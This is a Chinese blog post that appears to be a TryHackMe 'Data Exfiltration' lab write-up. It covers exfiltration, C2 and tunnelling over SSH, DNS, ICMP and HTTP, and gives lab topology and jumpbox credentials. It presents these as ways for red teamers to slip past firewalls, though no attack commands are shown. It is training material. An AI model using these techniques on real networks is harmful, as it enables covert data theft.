行该命令为上的隧道创建一个新的网络接口参数是在前台运行服务器参数是跳过检查每个请求的客户端地址和端口参数用于设置身份验证密码参数用于设置新网络接口的网络服务器的地址为客户端的地址为是我们之前设置的名称服务器在机器上我们需要连接到服务器端应用程序为此我们需要执行以下操作请注意我们执行了客户端工具并提供了之前解释过的和参数建立连接后我们打开一个新终端并通过登录到请注意网络上的所有通信都将通过进行我们将使用动态端口转发功能的参数来使用会话作为代理请注意我们使用参数强制进入后台参数强制客户端仅绑定到具体参数解释连接远程服务器登录用户名是使用地址不使用将在后台运行不连接控制终端不执行远程命令仅用于端口转发在本地端口上创建一个代理现在我们已经通过网络连接到打开一个新终端并使用或将和端口作为代理设置我们可以通过接口检查攻击者机器上的来确认所有流量都经过协议在所提供的网络环境中应用隧道技术访问回答以下问题结论在这个房间中我们介绍了数据泄露技术的基础知识包括各种网络协议完成这个房间后您现在应该对什么是数据泄露以及可以尝试用于传输数据的类型和协议有一个大致的了解例子以下是因数据泄露技术而成为数据泄露受害者的公司银行发生了一起内部数据泄露事件在多达万个客户敏感数据包括姓名地址电话号码和账户余额被盗后发现了离开网络的可疑流量特斯拉是内部人士数据泄露的受害者导致数据泄露年一名员工向第三方泄露了数十亿字节的机密照片和代码制造操作系统其中包括其他个人和敏感数据是世界领先的货币兑换专家年它是名为的勒索软件的受害者攻击者利用其中一台内部服务器的未修补漏洞攻击者利用其中一台内部服务器中未修补的漏洞使他们能够使用其中一种渗透技术将敏感数据从组织的网络中渗漏出来敏感数据包括个人身份信息和财务信息其他资源数据泄露并不限于本会议室讨论的协议和方法以下链接是可用于窃取数据或使用合法网站进行通信依靠可信站点项目生活',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-01 16:12:17',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-数据泄露</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-07-20T07:24:56.000Z" title="发表于 2024-07-20 15:24:56">2024-07-20</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-01T08:12:17.850Z" title="更新于 2024-08-01 16:12:17">2024-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">15.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>55分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-数据泄露"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/07/20/thm-shu-ju-xie-lu/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/07/20/thm-shu-ju-xie-lu/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/07/20/thm-shu-ju-xie-lu/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-数据泄露</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-07-20T07:24:56.000Z" title="发表于 2024-07-20 15:24:56">2024-07-20</time><time itemprop="dateCreated datePublished" datetime="2024-08-01T08:12:17.850Z" title="更新于 2024-08-01 16:12:17">2024-08-01</time></header><h1 id="0x01-介绍">0x01 介绍</h1>
<h2 id="欢迎来到数据泄露">欢迎来到数据泄露</h2>
<p>网络犯罪分子出于不同目的对公司使用各种互联网攻击。在大多数情况下，许多攻击都会导致数据泄露，威胁行为者窃取敏感数据并在暗网上出售或在线发布。</p>
<p>有人可能会问：威胁行为者如何将窃取的数据从公司网络转移到外部（也称为数据泄露）而不被发现？答案各不相同。威胁行为者可以执行多种技术，包括数据泄露。</p>
<p>数据泄露是一种非传统方法，用于将数据从受感染的计算机复制和传输到攻击者的计算机。数据渗漏技术用于模拟正常的网络活动，它依赖于 DNS、HTTP、SSH 等网络协议。通过常见协议进行的数据渗漏很难检测和区分合法流量和恶意流量。</p>
<p>某些协议并非旨在通过其传输数据。然而，威胁行为者找到了滥用这些协议来绕过基于网络的安全产品（例如防火墙）的方法。作为红队成员，使用这些技术对于避免被发现至关重要。</p>
<h2 id="学习目标">学习目标</h2>
<p>该室介绍了数据泄露类型，并展示了用于通过各种协议传输数据的技术。</p>
<ul>
<li>
<p>什么是数据泄露？</p>
</li>
<li>
<p>了解数据泄露类型及其使用方式。</p>
</li>
<li>
<p>通过协议进行数据泄露：Sockets、SSH、ICMP、HTTP(s) 和 DNS。</p>
</li>
<li>
<p>通过各种协议练习 C2 通信。</p>
</li>
<li>
<p>练习通过 DNS 和 HTTP 建立隧道。</p>
</li>
</ul>
<h2 id="房间先决条件">房间先决条件</h2>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtonetworking">Introductory Networking&nbsp;&nbsp;介绍性网络</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/protocolsandservers">Protocols and Servers&nbsp;&nbsp;协议和服务器</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://tryhackme.com/room/dnsindetail">DNS&nbsp;in Detail&nbsp;DNS 详细信息</a></p>
</li>
<li>
<p>使用 tmux 或类似工具！ （对于单次 SSH 登录的多个会话）</p>
</li>
</ul>
<h1 id="0x02-网络基础设施">0x02 网络基础设施</h1>
<p>对于这个房间，我们构建了一个网络来模拟实际场景，我们可以使用各种网络协议执行数据泄露和隧道传输。提供的虚拟机包含两个具有多个客户端的独立网络。我们还有一台“JumpBox”机器可以访问这两个网络。下图显示了有关该房间使用的网络环境的更多信息。</p>
<p>简单拓扑图如下：<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009646.png" alt></p>
<p>在接下来的各种协议任务中，请使用网络图作为参考。我们还设置了域名 <a target="_blank" rel="noopener" href="http://thm.com">thm.com</a>，以方便在网络环境内进行通信和连接。请查看下表，了解有关该房间使用的域名和网络访问的更多信息。</p>
<table>
<thead>
<tr>
<th><strong>Domain Name</strong></th>
<th><strong>IP Address</strong></th>
<th>**Network Access&nbsp;**</th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener" href="http://jump.thm.com">jump.thm.com</a></td>
<td>192.168.0.133</td>
<td>Net 1 and Net 2</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://uploader.thm.com">uploader.thm.com</a></td>
<td>172.20.0.100</td>
<td>Net 1</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://flag.thm.com">flag.thm.com</a></td>
<td><code>***.**.*.***</code></td>
<td>Net 1</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://victim2.thm.com">victim2.thm.com</a></td>
<td>172.20.0.101</td>
<td>Net 1</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://web.thm.com">web.thm.com</a></td>
<td>192.168.0.100</td>
<td>Net 2</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://icmp.thm.com">icmp.thm.com</a></td>
<td>192.168.0.121</td>
<td>Net 2</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://victim1.thm.com">victim1.thm.com</a></td>
<td>192.168.0.101</td>
<td>Net 2</td>
</tr>
</tbody>
</table>
<h2 id="部署虚拟机">部署虚拟机！</h2>
<p>通过部署 AttackBox 或连接到 VPN，部署提供的 VM 并通过 SSH 客户端连接到它。使用以下凭据连接到可访问内部网络的 Jumpbox 计算机。</p>
<p>Machine IP:&nbsp;MACHINE_IP&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Username:&nbsp;thm&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;Password:&nbsp;tryhackme</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ssh thm<span class="hljs-keyword">@MACHINE</span>_IP</code></pre>
<p>连接到 Jumpbox 计算机后，您就可以访问这两个网络。检查网络基础设施以获取更多信息。</p>
<h2 id="实验室推荐">实验室推荐</h2>
<ul>
<li>
<p>我们建议对大多数任务（TCP、SSH、ICMP、DNS）使用 JumpBox 和网络环境，以避免 DNS 和网络出现技术问题。但是，如果您更愿意使用 AttackBox 执行 DNS 隧道任务（任务 10），则必须将 AttackBox 的 DNS 设置更改为 MACHINE_IP。有关更改 AttackBox 的 DNS 的更多信息，请检查 DNS 配置（任务 8）。</p>
</li>
<li>
<p>大多数情况下，我们需要使用两台机器建立通信。因此，我们需要两个或更多可用的 Linux 终端来完成任务。因此，我们建议使用 tmux 工具通过单个 SSH 登录创建多个会话。</p>
</li>
</ul>
<h1 id="0x03-数据泄露">0x03 数据泄露</h1>
<h2 id="什么是数据泄露">什么是数据泄露</h2>
<p>数据泄露是获取未经授权的敏感数据副本并将其从组织网络内部移动到外部的过程。值得注意的是，数据泄露是一个受损后的过程，其中威胁参与者已经获得了网络访问权限并执行了各种活动来获取敏感数据。数据泄露通常发生在网络杀伤链模型的最后阶段，即目标行动。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009647.png" alt></p>
<p>数据泄露还用于隐藏对手的恶意活动并绕过安全产品。例如，DNS 渗透技术可以逃避安全产品，例如防火墙。</p>
<p>敏感数据可以有多种类型和形式，并且可能包含以下内容：</p>
<ul>
<li>用户名和密码或任何身份验证信息。</li>
<li>银行账户详细信息</li>
<li>业务战略决策。</li>
<li>加密密钥。</li>
<li>员工和人事信息。</li>
<li>项目代码数据。</li>
</ul>
<h2 id="如何使用数据渗透">如何使用数据渗透</h2>
<p>数据泄露有三种主要用例场景，包括：</p>
<ol>
<li>Exfiltrate data&nbsp;窃取数据</li>
<li>Command and control communications.  命令和控制通信。</li>
<li>Tunneling&nbsp;隧道技术</li>
</ol>
<h3 id="传统数据泄露">传统数据泄露</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009648.png" alt></p>
<h3 id="c2-通讯">C2 通讯</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009649.png" alt></p>
<p>许多 C2 框架提供了建立通信通道的选项，包括用于发送命令和接收来自受害计算机的响应的标准和非传统协议。在 C2 通信中，攻击者发送请求以在受害者的计算机中执行命令的请求数量有限。然后，代理的客户端执行命令并通过非传统协议发送包含结果的回复。通信将朝两个方向进行：进出网络。</p>
